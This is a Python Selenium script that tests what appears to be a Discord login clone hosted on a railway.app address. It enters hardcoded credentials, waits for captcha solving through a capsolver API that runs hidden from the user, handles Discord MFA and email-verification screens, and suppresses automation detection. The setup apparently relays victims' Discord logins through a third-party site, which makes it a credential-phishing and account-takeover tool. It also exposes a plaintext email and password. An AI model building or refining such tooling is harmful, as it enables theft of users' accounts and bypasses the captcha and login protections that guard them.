"""
Selenium test: enter credentials, submit, wait for server-side captcha solve.
With capsolver API key set, captcha is solved server-side (10-60s).
User will NOT see any captcha — just a loading spinner.
"""
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

URL = "https://web-production-2eb2c7.up.railway.app/"
EMAIL = "fortbot7@inbox.lv"
PASSWORD = "Fatman11$"

def main():
    print("[*] Setting up Chrome...")
    opts = Options()
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.set_capability("goog:loggingPrefs", {"browser": "ALL"})

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=opts
        )
    except Exception:
        driver = webdriver.Chrome(options=opts)

    driver.set_page_load_timeout(30)

    try:
        print(f"[*] Loading {URL}...")
        driver.get(URL)
        time.sleep(3)
        print(f"[*] Page title: {driver.title}")

        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        email_input.clear()
        email_input.send_keys(EMAIL)
        print("[*] Entered email")

        pw_input = driver.find_element(By.ID, "password")
        pw_input.clear()
        pw_input.send_keys(PASSWORD)
        print("[*] Entered password")

        login_btn = driver.find_element(By.ID, "login-btn")
        login_btn.click()
        print("[*] Clicked Login — waiting for server-side captcha solve (up to 120s)...")

        # Server-side solving takes 10-60s. Wait for result.
        for i in range(240):  # 120 seconds
            time.sleep(0.5)

            # Success redirect
            try:
                url = driver.current_url
                if "discord.com" in url or "channels" in url:
                    print(f"\n[+] SUCCESS! Redirected to: {url}")
                    return True
            except:
                pass

            # MFA screen
            try:
                mfa = driver.find_element(By.ID, "sec-mfa")
                if mfa.is_displayed():
                    print(f"\n[+] MFA SCREEN! Login worked, needs 2FA code")
                    return True
            except:
                pass

            # Email verification screen
            try:
                ev = driver.find_element(By.ID, "sec-email-verify")
                if ev.is_displayed():
                    print(f"\n[+] EMAIL VERIFY SCREEN! Captcha solved, Discord wants email verification.")
                    print(f"    Check fortbot7@inbox.lv for the Discord verification email.")
                    print(f"    Click 'Verify Login' in the email, then press Enter here to retry.")
                    input("    >> Press Enter after verifying email... ")
                    # Click the Continue button
                    btn = driver.find_element(By.ID, "email-verify-btn")
                    btn.click()
                    print(f"    [*] Clicked Continue — waiting for retry result (up to 120s)...")
                    # Reset loop to wait for retry result
                    continue
            except:
                pass

            # Email verify error
            try:
                everr = driver.find_element(By.ID, "email-verify-error")
                cls = everr.get_attribute("class") or ""
                if "show" in cls and everr.text:
                    print(f"\n[!] Email verify error: {everr.text}")
            except:
                pass

            # Error message
            try:
                err = driver.find_element(By.ID, "login-error")
                cls = err.get_attribute("class") or ""
                if "show" in cls:
                    print(f"\n[!] ERROR: {err.text}")
                    dump_logs(driver)
                    return False
            except:
                pass

            # Captcha stall overlay — click the hCaptcha checkbox, then interact with image grid
            try:
                hc_checkbox = driver.find_element(By.ID, "hc-checkbox")
                if hc_checkbox.is_displayed():
                    # Click checkbox if not already checked
                    tick = driver.find_element(By.ID, "hc-tick")
                    spinner = driver.find_element(By.ID, "hc-spinner")
                    if tick.value_of_css_property("display") == "none" and spinner.value_of_css_property("display") == "none":
                        print(f"    [*] hCaptcha checkbox visible, clicking...")
                        hc_checkbox.click()
                        time.sleep(1.5)
            except:
                pass

            # Click on images in the challenge grid and verify
            try:
                challenge = driver.find_element(By.ID, "hc-challenge")
                if challenge.is_displayed():
                    # Click 2-4 random grid cells
                    cells = driver.find_elements(By.CSS_SELECTOR, ".hc-grid-cell")
                    import random
                    to_click = random.sample(range(len(cells)), min(random.randint(2,4), len(cells)))
                    for idx in to_click:
                        cells[idx].click()
                        time.sleep(0.2)
                    time.sleep(0.5)
                    # Click verify
                    verify_btn = driver.find_element(By.ID, "hc-verify-btn")
                    if not verify_btn.get_attribute("disabled"):
                        print(f"    [*] Selected {len(to_click)} images, clicking Verify...")
                        verify_btn.click()
                        time.sleep(2)
            except:
                pass

            # Button still loading = server is working
            try:
                btn = driver.find_element(By.ID, "login-btn")
                if btn.get_attribute("disabled"):
                    if i % 20 == 0:
                        print(f"    ...server working ({i * 0.5}s)")
                elif i > 10:
                    # Button re-enabled without redirect/MFA/error = check final state
                    print(f"[*] Button enabled after {i * 0.5}s")
                    time.sleep(2)
                    break
            except:
                pass

        print(f"\n[*] Final URL: {driver.current_url}")
        dump_logs(driver)

    except Exception as e:
        print(f"[!] Test error: {e}")
        import traceback
        traceback.print_exc()
        try:
            dump_logs(driver)
        except:
            pass

    finally:
        input("\n[*] Press Enter to close browser...")
        try:
            driver.quit()
        except:
            pass

    return False


def dump_logs(driver):
    try:
        logs = driver.get_log("browser")
        print(f"\n[*] Browser console ({len(logs)} entries):")
        for log in logs:
            msg = log['message'][:600]
            level = log['level']
            lower = msg.lower()
            if any(k in lower for k in ['captcha', 'debug', 'challenge', 'hcap', 'invalid', 'error', 'fail', 'success', 'mfa', 'token']):
                print(f"  >>> [{level}] {msg}")
            elif level == 'SEVERE':
                print(f"  [SEVERE] {msg}")
    except Exception as e:
        print(f"[*] Logs: {e}")


if __name__ == "__main__":
    result = main()
    print(f"\n{'=' * 50}")
    print(f"RESULT: {'SUCCESS' if result else 'FAILED'}")
    print(f"{'=' * 50}")
